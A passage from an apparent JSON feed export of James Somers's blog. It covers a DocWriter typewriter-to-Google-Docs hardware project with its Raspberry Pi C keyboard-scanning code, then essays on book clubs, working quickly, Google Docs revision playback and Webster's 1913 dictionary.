fine wordwork that comes right before publication, but for the big stuff, too, like when you want to move sections around, or see what a story looks like without a side character. Doing this kind of thing on a typewriter would be a nightmare &#8212; to say nothing of the simple fact that your words will have to be digitized at some point and it&#8217;s just not practical to scan them or type them up off a sheet of paper.</p>\n\n<p>The idea behind the DocWriter is to be a bridge between these tools so that each serves its purpose: the typewriter, to create the building blocks of a piece of writing, and the word processor, to make the most of them.</p>\n\n<p><strong>How we built it</strong></p>\n\n<p>The DocWriter is actually pretty simple: we took a Brother SX-4000 electronic typewriter and spied on its <a href=\"http://esd.cs.ucr.edu/labs/decode_key/decode_key.html\">keyboard switch matrix</a> by soldering a few wires onto the main circuit board; we ran those to a Raspberry Pi 3, which runs a C program that reverse engineers the signals; we pipe this data over ssh to a computer program running in the cloud; that program maps the signals to keystrokes and runs a headless web browser that types the keys into a new Google Doc.</p>\n\n<div style=\"text-align: center; margin:0 auto; margin-bottom: 20px;\">\n  <img decoding=\"async\" style=\"width: 500px;\" src=\"https://user-images.githubusercontent.com/21294/30526918-8681ee20-9bf0-11e7-8331-841355df733e.png\"/>\n</div>\n\n<p>From the user’s perspective, you’re just using a typewriter. The Raspberry Pi is hidden inside it (the blue box in the image above), and it draws power from the typewriter itself, so there’s no extra cord. When you turn on the typewriter, it boots the Pi, which connects itself to your WiFi network, and runs the program that listens for keystrokes and pipes them to the cloud. You know that the DocWriter is ready once you get an email from Google Docs saying that the machine has shared a new document with you.</p>\n\n<p>We&#8217;re indebted to <a href=\"http://numist.net/post/2010/project-typewriter.html\">numist</a>, who turned the same model typewriter into a teletype using software much more sophisticated than ours. That work made our project seem doable, and gave us many clues about the kinds of problems we&#8217;d encounter along the way.</p>\n\n<p>There were, indeed, many problems: we had a surprisingly hard time getting the case off the typewriter when we first bought it; by unlatching the keyboard, we inadvertently triggered a condition where the motor would endlessly grind up against the case, and nearly convinced ourselves we&#8217;d broken the machine; the early versions of our controller code erroneously piped data <em>to</em> the typewriter, causing all kinds of weird behavior; we built the whole setup three times, first on an Arduino and then on a Raspberry Pi Zero, before settling on the Pi 3; we had a bad connection on a wire that caused some keys to fail; we wrote elaborate code to compensate for noise on the lines, before realizing that we could use pull-up resistors to more or less eliminate it entirely; we spent nearly a full day just installing a headless web browser that worked; and we had to rewrite our main control code about a dozen times.</p>\n\n<div style=\"text-align: center; margin:0 auto; margin-bottom: 20px;\">\n  <img decoding=\"async\" style=\"width: 500px;\" src=\"https://user-images.githubusercontent.com/21294/30525634-48e3d73a-9bd8-11e7-82e5-95c9252e5d98.png\">\n</div>\n\n<p>In the end, though, the setup is elegant: along with wires for power and ground, we had to solder just 16 connections onto the pins controlling the keyboard switch matrix on the typewriter&#8217;s circuit board. The rest is software, most of which does exactly what you&#8217;d expect. The hardest code to write was the controller to read the raw signals from the typewriter. But we got it down to something with nearly perfect behavior that&#8217;s also pretty minimal (especially when you ignore special cases for the Shift key):</p>\n\n<div class=\"highlight highlight-source-c\"><pre>#<span class=\"k\">include</span> <span class=\"s\"><span class=\"pds\">&lt;</span>wiringPi.h<span class=\"pds\">&gt;</span></span>\n#<span class=\"k\">include</span> <span class=\"s\"><span class=\"pds\">&lt;</span>stdio.h<span class=\"pds\">&gt;</span></span>\n \n<span class=\"k\">int</span> <span class=\"en\">main</span>(<span class=\"k\">void</span>) {\n  <span class=\"no\">wiringPiSetup</span>();\n  <span class=\"no\">setbuf</span>(stdout, <span class=\"no\">NULL</span>);\n\n  <span class=\"k\">int</span> scanPins[] = {<span class=\"no\">5</span>, <span class=\"no\">22</span>, <span class=\"no\">10</span>, <span class=\"no\">11</span>, <span class=\"no\">26</span>, <span class=\"no\">27</span>, <span class=\"no\">28</span>, <span class=\"no\">29</span>};\n  <span class=\"k\">int</span> signalPins[] = {<span class=\"no\">13</span>, <span class=\"no\">12</span>, <span class=\"no\">3</span>, <span class=\"no\">2</span>, <span class=\"no\">0</span>, <span class=\"no\">7</span>, <span class=\"no\">24</span>, <span class=\"no\">23</span>};\n  \n  <span class=\"k\">int</span> i = <span class=\"no\">0</span>;\n  <span class=\"k\">int</span> j = <span class=\"no\">0</span>;\n  <span class=\"k\">for</span> (i=<span class=\"no\">0</span>; i&lt;<span class=\"no\">8</span>; i++) {\n    <span class=\"no\">pinMode</span>(scanPins[i], INPUT);\n    <span class=\"no\">pinMode</span>(signalPins[i], INPUT);\n    <span class=\"no\">pullUpDnControl</span>(scanPins[i], PUD_UP);\n    <span class=\"no\">pullUpDnControl</span>(signalPins[i], PUD_UP);\n  }\n  \n  <span class=\"k\">int</span> keyDown[<span class=\"no\">8</span>][<span class=\"no\">8</span>] = {\n    {<span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>},\n    {<span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>},\n    {<span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>},\n    {<span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>},\n    {<span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>},\n    {<span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>},\n    {<span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>},\n    {<span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>, <span class=\"no\">0</span>}\n  };\n\n  <span class=\"k\">int</span> lastI;\n  <span class=\"k\">int</span> lastJ;\n  <span class=\"k\">int</span> sameKeyCount = <span class=\"no\">0</span>;\n  <span class=\"k\">for</span> (;;) {\n    <span class=\"k\">for</span> (i=<span class=\"no\">0</span>; i&lt;<span class=\"no\">8</span>; i++) {\n      <span class=\"k\">for</span> (j=<span class=\"no\">0</span>; j&lt;<span class=\"no\">8</span>; j++) {\n        <span class=\"k\">if</span> (<span class=\"no\">digitalRead</span>(scanPins[i]) == LOW &amp;&amp; <span class=\"no\">digitalRead</span>(signalPins[j]) == LOW) {\n          (i == lastI &amp;&amp; j == lastJ) ? sameKeyCount++ : sameKeyCount = <span class=\"no\">0</span>;\n\n          <span class=\"k\">if</span> (sameKeyCount &gt; <span class=\"no\">50</span> &amp;&amp; keyDown[i][j] &lt;= <span class=\"no\">0</span>) {\n            <span class=\"no\">printf</span>(<span class=\"s\"><span class=\"pds\">\"</span><span class=\"no\">%d</span>,<span class=\"no\">%d</span><span class=\"cce\">\\n</span><span class=\"pds\">\"</span></span>, i, j);\n            keyDown[i][j] = <span class=\"no\">50</span>;\n          }\n          lastI = i;\n          lastJ = j;\n        }\n        \n        <span class=\"k\">if</span> (<span class=\"no\">digitalRead</span>(scanPins[i]) == LOW &amp;&amp; <span class=\"no\">digitalRead</span>(signalPins[j]) == HIGH) {\n          keyDown[i][j] = (keyDown[i][j] - <span class=\"no\">1</span>);\n        }\n      }\n    }\n  }\n}</pre></div>\n\n<p>A Ruby program in the cloud takes the output of this program (raw indexes like &#8220;6,0&#8221; for spacebar, or &#8220;5,3&#8221; for &#8220;j&#8221;) and maps them to strings, which it sends to a Google Doc using the <a href=\"http://watir.com/\">watir</a> gem for driving headless web browsers.</p>\n\n<p><strong>Can I get one?</strong></p>\n\n<p>For now this is just a one-off project, and we sadly won&#8217;t have the bandwidth to make others—except maybe for an exorbitant and unfair price (like $10,000).</p>\n",
          "category": "Uncategorized",
          "link": "http://jsomers.net/blog/docwriter",
          "creator": "James Somers",
          "pubDate": "Mon, 18 Sep 2017 01:56:16 +0000",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "jsomers",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "3becfe3a0c7f3cb1371c7a80a709f3da",
          "highlights": []
        },
        {
          "title": "Most book clubs are doing it wrong",
          "description": "The standard way to run a book club is to have everybody finish the book before meeting to talk about it. You have one meeting per book. The discussion goes on for one or two hours before it runs out of gas, and then the group picks the next book, and you agree to meet [&#8230;]",
          "content": "<p>The standard way to run a book club is to have everybody finish the book before meeting to talk about it. You have one meeting per book. The discussion goes on for one or two hours before it runs out of gas, and then the group picks the next book, and you agree to meet in another month or six weeks.</p>\n\n<p>You would never run a class this way, because it practically minimizes the value that each participant gets from being in the group. The problem is that there&#8217;s no time to cash in on anyone else&#8217;s insights. If someone says something in the meeting that reframes how you think about the book &#8212; they suggest that Holden is lying, or that Kinbote wrote Canto IV; they tell you to read <em>Portrait</em> first, so you can understand Stephen&#8217;s double bind; they claim that Offred&#8217;s tale is a series of transcripts, not journal entries &#8212; well, now it&#8217;s too late, because you&#8217;ve finished reading the book and you&#8217;re probably never going back to it.</p>\n\n<p>What makes a class useful is precisely that it lets you compare notes with your classmates <em>along the way</em>, to float your working theories about a book and see how they sound to others. It&#8217;s not a retrospective, or not merely one &#8212; you&#8217;re <em>equipping</em> yourself for the rest of the reading.</p>\n\n<p>This is true not just of frameworks or theories or whatever but of little nuts-and-bolts stuff, too, like when someone points out a reference that you missed or helps you savor some language that you blew right by the first time. That kind of thing is especially valuable when you&#8217;re reading a difficult book.</p>\n\n<p>My book club started four years ago to read <em>Infinite Jest</em>. There were five or six of us; we had all tried, and failed, to read the book on our own. We met every week and read about fifty pages for each meeting &#8212; five or six hours&#8217; worth for a book that dense. If you were out of town, you tried to call or Skype in, and you were forgiven for missing a few sessions, so long as you more or less kept up with the reading.</p>\n\n<p>Since then we&#8217;ve run just about continuously, every week, week in, week out, for four years. We&#8217;ve read other hard books, and easy ones too, and no matter what, we&#8217;ve always split the reading into at least more than one meeting, because isn&#8217;t that after all how you make use of those other minds? Book club, for us, isn&#8217;t about reading the same book; it&#8217;s about reading a book <em>together</em>.</p>\n\n<p>We try to keep the reading to about the amount you can do in a few hours on a Sunday afternoon. Weekly book club has become a fixture in our schedules, an institution like family dinner, though it&#8217;s not uncommon for someone to skip a whole book, say if they&#8217;re traveling a lot or right after they&#8217;ve started a new job. The idea is to make book club less an obligation than a sort of pleasant presence in our lives, this thing that&#8217;s always there.</p>\n\n<p>Some books don&#8217;t really demand so much attention, and our book-talk during those sessions quickly devolves into banter. But most of the time the discussion lasts a full hour before it runs out of steam, naturally, the way almost all meetings seem to.</p>\n\n<p>That&#8217;s another reason to break a book into pieces: better to have too little to fit into a session than too much; god forbid you read something complex and demanding &#8212; do you really want to spend three hours in the unpacking, or to have the session break down before the unpacking&#8217;s done? And what are the odds that you&#8217;ll even remember most of the book by the time six weeks pass?</p>\n\n<p>Good books are almost fractally deep: you find whole worlds wherever you look, and no matter how far in you zoom. Breaking a book into multiple meetings makes the most of this fact. It gives you space to <em>dwell</em> &#8212; on a page, even on a single word &#8212; without feeling like you&#8217;re wasting anyone&#8217;s time. No: that&#8217;s what a book club is <em>for</em>, not to sum up what you&#8217;ve read but to live inside it.</p>\n\n<p>I don&#8217;t know why more people don&#8217;t run book clubs this way. I think part of it is that they&#8217;ve never tried; the very concept of a book club seems to imply a one-book-per-meeting structure. Others hear the idea of meeting weekly and think who has the time?</p>\n\n<p>I would say that anyone who loves books has the time. A book club run in the standard way isn&#8217;t efficient or practical &#8212; it&#8217;s just a good opportunity wasted.</p>\n",
          "category": "Uncategorized",
          "link": "http://jsomers.net/blog/book-clubs",
          "creator": "James Somers",
          "pubDate": "Sat, 15 Jul 2017 18:25:52 +0000",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "jsomers",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "0bd9869a4c14a9a9b6271a745ff0c18d",
          "highlights": []
        },
        {
          "title": "Speed matters: Why working quickly is more important than it seems",
          "description": "The obvious benefit to working quickly is that you&#8217;ll finish more stuff per unit time. But there&#8217;s more to it than that. If you work quickly, the cost of doing something new will seem lower in your mind. So you&#8217;ll be inclined to do more. The converse is true, too. If every time you write [&#8230;]",
          "content": "<p>The obvious benefit to working quickly is that you&#8217;ll finish more stuff per unit time. But there&#8217;s more to it than that. If you work quickly, the cost of doing something new will seem lower in your mind. So you&#8217;ll be inclined to do more.</p>\n\n<p>The converse is true, too. If every time you write a blog post it takes you six months, and you&#8217;re sitting around your apartment on a Sunday afternoon thinking of stuff to do, you&#8217;re probably not going to think of starting a blog post, because it&#8217;ll feel too expensive.</p>\n\n<p>What&#8217;s worse, because you blog slowly, you&#8217;re liable to <em>continue</em> blogging slowly—simply because the only way to learn to do something fast is by doing it lots of times.</p>\n\n<p>This is true of any to-do list that gets worked off too slowly. A malaise creeps into it. You keep adding items that you never cross off. If that happens enough, you might one day stop putting stuff onto the list.</p>\n\n<p style=\"text-align: center; margin:0 auto; margin-bottom: 10px;\">* * *</p>\n\n<p>I&#8217;ve noticed that if I respond to people&#8217;s emails quickly, they send me more emails. The sender learns to expect a response, and that expectation spurs them to write. That is, <em>speed itself</em> draws emails out of them, because the projected cost of the exchange in their mind is low. They know they&#8217;ll get something for their effort. It&#8217;ll happen so fast they can already taste it.</p>\n\n<p>It&#8217;s now well known on the web that slow server response times drive users away. A slow website feels broken. It frustrates the goer&#8217;s desire. Probably it deprives them of some dopaminergic reward.</p>\n\n<p>Google famously prioritized speed as a feature. They realized that if search is fast, you&#8217;re more likely to search. The reason is that it encourages you to try stuff, get feedback, and try again. When a thought occurs to you, you know Google is already there. There is no delay between thought and action, no opportunity to lose the impulse to find something out. The projected cost of googling is nil. It comes to feel like an extension of your own mind.</p>\n\n<p>It is a truism, too, in workplaces, that faster employees get assigned more work. Of course they do. Humans are lazy. They want to preserve calories. And it&#8217;s exhausting merely thinking about giving work to someone slow. When you&#8217;re thinking about giving work to someone slow, you run through the likely quagmire in your head; you visualize days of halting progress. You imagine a resource—this slow person—tied up for awhile. It&#8217;s wearisome, even in the thinking. Whereas the <em>fast</em> teammate—well, their time feels cheap, in the sense that you can give them something and know they&#8217;ll be available again soon. You aren&#8217;t &#8220;using them up&#8221; by giving them work. So you route as much as you can through the fast people. It&#8217;s ironic: your company&#8217;s most valuable resources—because they finish things quickly—are the easiest to consume.</p>\n\n<p>The general rule seems to be: systems which eat items quickly are fed more items. Slow systems starve.</p>\n\n<p>Two more quick examples. What&#8217;s true of individual people turns out also to be true of whole organizations. If customers find out that you take two months to frame photos, they&#8217;ll go to another frame shop. If contributors discover that you&#8217;re slow to merge pull requests, they&#8217;ll stop contributing. Unresponsive systems are sad. They&#8217;re like buildings grown over with moss. They&#8217;re a kind of <em>memento mori</em>. People would rather be reminded of life. They&#8217;ll leave for places that get back to them quickly.</p>\n\n<p>Even now, I&#8217;m working in a text editor whose undo feature, for whatever reason, has suddenly become slow. It&#8217;s killing me. It disinclines me, for one thing, from undoing stuff. But it&#8217;s also probably subtly changing the way I work. I feel like I can&#8217;t <em>rely</em> on undo. So if I want to delete something but think I might want it later, I&#8217;m copying it to the bottom of the file, like it&#8217;s the 1980s. All this because undo is so slow that it might as well not exist. Undo, when it&#8217;s fast, is an incredible feature; at any moment, you can dip into the past, borrow something, and zip back. But now it feels like a dead end.</p>\n\n<p>Part of the <a href=\"https://en.wikipedia.org/wiki/Activation_energy\">activation energy</a> required to start any task comes from the picture you get in your head when you imagine doing it. It may not be that going for a run is actually costly; but if it <em>feels</em> costly, if the picture in your head <em>looks</em> like a slog, then you will need a bigger expenditure of will to lace up.</p>\n\n<p>Slowness seems to make a special contribution to this picture in our heads. Time is especially valuable. So as we learn that a task is slow, an especial cost accrues to it. Whenever we think of doing the task again, we see how expensive it is, and bail.</p>\n\n<p>That&#8217;s why speed matters.</p>\n\n<p style=\"text-align: center; margin:0 auto; margin-bottom: 10px;\">* * *</p>\n\n<p>The prescription must be that if there&#8217;s something you want to do a lot of and get good at—like write, or fix bugs—you should try to do it <em>faster</em>.</p>\n\n<p>That doesn&#8217;t mean be sloppy. But it does mean, push yourself to go faster than you think is healthy. That&#8217;s because the task will come to cost less in your mind; it&#8217;ll have a lower activation energy. So you&#8217;ll do it more. And as you do it more (as long as you&#8217;re doing it <a href=\"http://jsomers.net/blog/deliberate-practice\">deliberately</a>), you&#8217;ll get better. Eventually you&#8217;ll be both fast <em>and</em> good.</p>\n\n<p>Being fast is fun. If you&#8217;re a fast writer, you&#8217;ll constantly be playing with new ideas. You won&#8217;t be bogged down in a single dread effort. And because your to-do list gets worked off, you&#8217;ll always be thinking of more stuff to add to it. With more drafts in the works, <a href=\"http://jsomers.net/blog/more-people-should-write\">more of the world will pop alive</a>. You will feel flexible and capable and practiced so that when something demanding and long arrives on your desk, you won&#8217;t back down afraid.</p>\n\n<p>Now, as a disclaimer, I should remind you of the rule that anyone writing a blog post advising against <em>X</em> is himself the worst <em>X</em>er there is. At work, I have a history of painful languished projects, and I usually have the most overdue assignments of anyone on the team. As for writing, well, I have been working on this little blog post, on and off, no joke, for six years.</p>\n\n<div style=\"text-align: center; margin:0 auto; margin-bottom: 20px\">\n<a href=\"http://jsomers.net/blog/wp-content/uploads/2015/07/Screen-Shot-2015-07-26-at-6.03.14-PM.png\"><img decoding=\"async\" loading=\"lazy\" src=\"http://jsomers.net/blog/wp-content/uploads/2015/07/Screen-Shot-2015-07-26-at-6.03.14-PM.png\" alt=\"Screen Shot 2015-07-26 at 6.03.14 PM\" width=\"377\" height=\"540\" class=\"alignnone size-full wp-image-1234\" srcset=\"http://jsomers.net/blog/wp-content/uploads/2015/07/Screen-Shot-2015-07-26-at-6.03.14-PM.png 377w, http://jsomers.net/blog/wp-content/uploads/2015/07/Screen-Shot-2015-07-26-at-6.03.14-PM-209x300.png 209w\" sizes=\"(max-width: 377px) 100vw, 377px\" /></a>\n</div>\n",
          "category": "Uncategorized",
          "link": "http://jsomers.net/blog/speed-matters",
          "creator": "James Somers",
          "pubDate": "Sun, 26 Jul 2015 22:16:55 +0000",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "jsomers",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "8dfee424898b60d4a09f7bc35def4ea8",
          "highlights": []
        },
        {
          "title": "How I reverse-engineered Google Docs to play back any document’s keystrokes",
          "description": "If you&#8217;ve ever typed anything into a Google Doc, you can now play it back as if it were a movie &#8212; like traveling through time to look over your own shoulder as you write. This is possible because every document written in Google Docs since about May 2010 has a revision history that tracks [&#8230;]",
          "content": "<p>If you&#8217;ve ever typed anything into a Google Doc, you can now play it back as if it were a movie &#8212; like traveling through time to look over your own shoulder as you write.</p>\n\n<p>This is possible because every document written in Google Docs since about May 2010 has a revision history that tracks every change, by every user, with timestamps accurate to the microsecond; these histories are available to anyone with &#8220;Edit&#8221;\n permissions; and I have written a piece of software that can find, decode, and rebuild the history for any given document.</p>\n\n<p>The details are <a href=\"http://features.jsomers.net/how-i-reverse-engineered-google-docs/\">here</a>.</p>\n",
          "category": "Uncategorized",
          "link": "http://jsomers.net/blog/docs-brief",
          "creator": "James Somers",
          "pubDate": "Mon, 10 Nov 2014 14:53:21 +0000",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "jsomers",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "85766bb32da8fa51ecdb6158499f9ad3",
          "highlights": []
        },
        {
          "title": "You’re probably using the wrong dictionary",
          "description": "The way I thought you used a dictionary was that you looked up words you&#8217;ve never heard of, or whose sense you&#8217;re unsure of. You would never look up an ordinary word &#8212; like example, or sport, or magic &#8212; because all you&#8217;ll learn is what it means, and that you already know. Indeed, if [&#8230;]",
          "content": "<p>The way I thought you used a dictionary was that you looked up words you&#8217;ve never heard of, or whose sense you&#8217;re unsure of. You would never look up an ordinary word &#8212; like <em>example</em>, or <em>sport</em>, or <em>magic</em> &#8212; because all you&#8217;ll learn is what it means, and that you already know.</p>\n\n<p>Indeed, if you look up those particular words in the dictionary that comes with your computer &#8212; on my Mac, it&#8217;s the <em>New Oxford American Dictionary, 3rd Edition</em> &#8212; you&#8217;ll be rewarded with&#8230; well, there won&#8217;t be any reward. The entries are pedestrian:</p>\n\n<p><strong>example</strong> /igˈzampəl/, n. <em>a thing characteristic of its kind or illustrating a general rule</em>.</p>\n\n<p><strong>sport</strong> /spôrt/, n. <em>an activity involving physical exertion and skill in which an individual or team competes against another or others for entertainment</em>.</p>\n\n<p><strong>magic</strong> /ˈmajik/, n. <em>the power of apparently influencing the course of events by using mysterious or supernatural forces</em>.</p>\n\n<p>Here, words are boiled to their essence. But that essence is dry, functional, almost bureaucratically sapped of color or pop, like <a href=\"http://upload.wikimedia.org/wikipedia/commons/6/6f/Pruitt-Igoe-overview.jpg\">high modernist architecture</a>. Which trains you to think of the dictionary as a utility, not a quarry of good things, not a place you&#8217;d go to explore and savor.</p>\n\n<p>Worse, the words themselves take on the character of their definitions: they are likewise reduced. A delightful word like &#8220;fustian&#8221; &#8212; delightful because of what it means, because of the way it looks and sounds, because it is unusual in regular speech but not so effete as to be unusable, is described, efficiently, as &#8220;pompous or pretentious speech or writing.&#8221; Not only is this definition (as we&#8217;ll see in a minute) simplistic and basically wrong, it&#8217;s just not in the same class, English-wise, as &#8220;fustian.&#8221; The language is tin-eared and uninspired. It&#8217;s criminal: This is the place where all the words live and the writing&#8217;s no good.</p>\n\n<p>The New Oxford American dictionary, by the way, is not like singularly bad. Google&#8217;s dictionary, the modern Merriam-Webster, the dictionary at dictionary.com: they&#8217;re all like this. They&#8217;re all a chore to read. There&#8217;s no play, no delight in the language. The definitions are these desiccated little husks of technocratic meaningese, as if a word were no more than its coordinates in semantic space.</p>\n\n<h3>John McPhee&#8217;s secret weapon</h3>\n\n<p>John McPhee &#8212; one the great American writers of nonfiction, almost peerless as a prose stylist &#8212; once wrote an essay for the New Yorker about his process called &#8220;<a href=\"http://jsomers.net/mcphee-draft-no-4.pdf\">Draft #4</a>.&#8221; He explains that for him, draft #4 is the draft after the painstaking labor of creation is done, when all that&#8217;s left is to punch up the language, to replace shopworn words and phrases with stuff that sings.</p>\n\n<p>The way you do it, he says, is &#8220;you draw a box not only around any word that does not seem quite right but also around words that fulfill their assignment but seem to present an opportunity.&#8221; You go looking for <em>le mot juste</em>.</p>\n\n<p>But where?</p>\n\n<p>&#8220;Your destination is the dictionary,&#8221; he writes:</p>\n\n<blockquote>\n  <p>Suppose you sense an opportunity beyond the word &#8220;intention.&#8221; You read the dictionary&#8217;s thesaurian list of synonyms: &#8220;intention, intent, purpose, design, aim, end, object, objective, goal.&#8221; But the dictionary doesn&#8217;t let it go at that. It goes on to tell you the differences all the way down the line &#8212; how each listed word differs from all the others. Some dictionaries keep themselves trim by just listing synonyms and not going on to make distinctions. You want the first kind, in which you are not just getting a list of words; you are being told the differences in their hues, as if you were looking at the stripes in an awning, each of a subtly different green.</p>\n</blockquote>\n\n<p>I do not have this first kind of dictionary. In fact I would have never thought to use a dictionary the way McPhee uses his, and the simple reason is that I&#8217;ve never had a dictionary <em>worth</em> using that way. If you were to look up the word &#8220;intention&#8221; in my dictionary here&#8217;s all you would see: &#8220;a thing intended; an aim or plan.&#8221; No, I don&#8217;t think I&#8217;ll be punching up my prose with that.</p>\n\n<p>But somehow for McPhee, the dictionary &#8212; the dictionary! &#8212; was the fount of fine prose, the first place he&#8217;d go to filch a phrase, to steal fire from the gods. So for instance he&#8217;d have an idea of something he wanted to say:</p>\n\n<blockquote>\n  <p>I grew up in canoes on northern lakes. Thirty years later, I was trying to choose a word or words that would explain why anyone in a modern nation would choose to go a long distance by canoe. I was damned if I was going to call it a sport, but nothing else occurred.</p>\n</blockquote>\n\n<p>And he&#8217;d go, Well, &#8220;sport&#8221; is kind of clunky, it&#8217;s kind of humdrum. Maybe I can do better. And he&#8217;d look up &#8220;sport,&#8221; and instead of the even more hopelessly banal &#8220;an activity involving physical exertion and skill&#8221; that I&#8217;d get out of my dictionary, he&#8217;d discover this lovely chip of prose: &#8220;2. A diversion of the field.&#8221; Thus he could write:</p>\n\n<blockquote>\n  <p>His professed criteria were to take it easy, see some wildlife, and travel light with his bark canoes &#8212; nothing more &#8212; and one could not help but lean his way&#8230; Travel by canoe is not a necessity, and will nevermore be the most efficient way to get from one region to another, or even from one lake to another &#8212; anywhere. A canoe trip has become simply a rite of oneness with certain terrain, a diversion of the field, an act performed not because it is necessary but because there is value in the act itself.</p>\n</blockquote>\n\n<p>A book where you can enter &#8220;sport&#8221; and end up with &#8220;a diversion of the field&#8221; &#8212; this is in fact the opposite of what I&#8217;d known a dictionary to be. This is a book that transmutes plain words into language that&#8217;s finer and more vivid and sometimes more rare. No wonder McPhee wrote with it by his side. No wonder he looked up words he knew, versus words he didn&#8217;t, in a ratio of &#8220;at least ninety-nine to one.&#8221;</p>\n\n<p>Unfortunately, he never comes out and says exactly which dictionary he&#8217;s getting all this juice out of. But I was desperate to find it. What was this secret book, this dictionary so rich and alive that one of my favorite writers was using it to make heroic improvements to his writing?</p>\n\n<p>I did a little sleuthing. It wasn&#8217;t so hard with the examples McPhee gives, and Google. He says, for instance, that in three years of research for a book about Alaska he&#8217;d forgotten to look up the word <em>Arctic</em>. He said that his dictionary gave him this: &#8220;Pertaining to, or situated under, the northern constellation called the Bear.&#8221;</p>\n\n<p>And that turned out to be enough to find it.</p>\n\n<h3>The invention of American English</h3>\n\n<p>Noah Webster is not the best-known of the Founding Fathers but he has been called &#8220;the father of American scholarship and education.&#8221; There&#8217;s actually this great <a href=\"https://en.wikipedia.org/wiki/Noah_Webster#Blue_Backed_Speller\">history</a> of how he almost singlehandedly invented the very idea of <em>American</em> English, defining the native tongue of the new republic, &#8220;rescuing&#8221; it from &#8220;the clamour of pedantry&#8221; imposed by the Brits.</p>\n\n<p>He developed a book, the Blue Backed Speller, which was meant to be something of a complete linguistic education for young American kids, teaching them in easy increments how to read, spell, and pronounce words, and bringing them up on a balanced diet of great writing. It succeeded. It was actually the most popular book of its time; by 1890 it had sold 60 million copies.</p>\n\n<p>But that wasn&#8217;t even Webster&#8217;s most ambitious project. Certainly it&#8217;s not what he became known for. In 1807, he started writing a dictionary, which he called, boldly, <em>An American Dictionary of the English Language</em>. He wanted it to be comprehensive, authoritative. Think of that: a man sits down, aiming to capture his language whole.</p>\n\n<p>Dictionaries today are not written this way. In fact it&#8217;d be strange even to say that they&#8217;re <em>written</em>. They are <em>built</em> by a large team, less a work of art than of engineering. When you read an entry you don&#8217;t get the sense that a person labored at his desk, alone, trying to put the essence of that word into words. That is, you don&#8217;t get a sense, the way you do from a good novel, that there was another mind as alive as yours on the other side of the page.</p>\n\n<p>Webster&#8217;s dictionary took him 26 years to finish. It ended up having 70,000 words. He wrote it all himself, including the etymologies, which required that he learn 28 languages, including Old English, Gothic, German, Greek, Latin, Italian, Spanish, Dutch, Welsh, Russian, Aramaic, Persian, Arabic, and Sanskrit. He was plagued by debt to fund the project; he had to mortgage his home.</p>\n\n<p>In his own lifetime the dictionary sold poorly and got little recognition. Today, of course, his name is so synonymous with even the idea of a dictionary that <em>Webster</em> is actually a <a href=\"https://en.wikipedia.org/wiki/Genericized_trademark\">genericized trademark</a> in the U.S., so that other dictionaries <em>whose contents bear no relation to Webster&#8217;s original</em> can <a href=\"https://en.wikipedia.org/wiki/Webster's_Dictionary#The_name_Webster_used_by_others\">use</a> the name just to have the &#8220;Webster&#8221; brand rub off on them. [1]</p>\n\n<p style=\"text-align: center; margin:0 auto; margin-bottom: 10px;\">* * *</p>\n\n<p>It makes sense: there was, and is, something remarkable about his 1828 dictionary, and the editions that followed in its line (the New and Revised 1847, the Unabridged 1864, the International 1890 and 1900, the New International 1909, the 1913, etc.). You can see why it became cliché to start a speech with &#8220;Webster&#8217;s defines X as&#8230;&#8221;: with his dictionary the definition that followed was actually likely to lend gravitas to your remarks, to sound so good, in fact, that it&#8217;d beat anything you could come up with on your own.</p>\n\n<p>Take a simple word, like &#8220;flash.&#8221; In all the dictionaries I&#8217;ve ever known, I would have never looked up that word. I&#8217;d&#8217;ve had no reason to &#8212; I already knew what it meant. But go <a href=\"https://web.archive.org/web/20160108161120/http://machaut.uchicago.edu:80/websters\">look up &#8220;flash&#8221; in Webster&#8217;s</a> (the edition I&#8217;m using is the 1913). The first thing you&#8217;ll notice is that the example sentences don&#8217;t sound like they came out of a DMV training manual (&#8220;the lights started flashing&#8221;) &#8212; they come from Milton and Shakespeare and Tennyson (&#8220;A thought flashed through me, which I clothed in act&#8221;).</p>\n\n<p>You&#8217;ll find a sense of the word that is somehow more evocative than any you&#8217;ve seen. &#8220;2. To convey as by a flash&#8230; as, to flash a message along the wires; to flash conviction on the mind.&#8221; In the juxtaposition of those two examples &#8212; a message transmitted by wires; a feeling that comes suddenly to mind &#8212; is a beautiful analogy, worth dwelling on, and 